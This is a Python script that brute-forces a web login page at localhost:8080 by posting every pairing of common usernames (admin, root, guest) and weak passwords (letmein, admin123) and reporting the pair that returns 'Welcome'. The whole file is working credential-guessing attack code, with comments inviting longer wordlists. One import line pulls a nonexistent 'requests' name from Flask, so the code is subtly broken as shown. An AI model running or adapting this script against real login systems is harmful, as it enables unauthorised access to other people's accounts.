import requests
# pip install requests

from flask import Flask, requests, render_template, render_template_string, redirect



# Define the target URL
url = "http://localhost:8080/login"

# List of possible usernames (can be loaded from a file or database)
usernames = [
    'admin', 'user', 'guest', 'root', 'administrator_', 'test', 'superuser'
    # Add more usernames to the list as needed
]

# List of possible passwords (can also be loaded from a file or database)
passwords = [
    'password', 'abc123', 'admin123', 'welcome', 'admin_123', 'letmein', 'admin', 'password1'
    # Add more passwords to the list as needed
]

# Loop through each username
for username in usernames:
    # Loop through each password for the current username
    for password in passwords:
        # Prepare the data payload
        data = {
            'username': username,
            'password': password
        }

        # Send the POST request to the login page
        response = requests.post(url, data=data)

        # Check if login was successful
        if "Welcome" in response.text:
            print(f"\n..:: Login successful! Access granted with username: {username} and password: {password}\n")
            break  # Stop checking once a successful login is found
        else:
            print(f"\n--> Login failed for username: {username} with password: {password}")
    else:
        # If no successful login is found for the current username, continue with the next username
        continue
    # If a successful login was found, exit the outer loop as well
    break

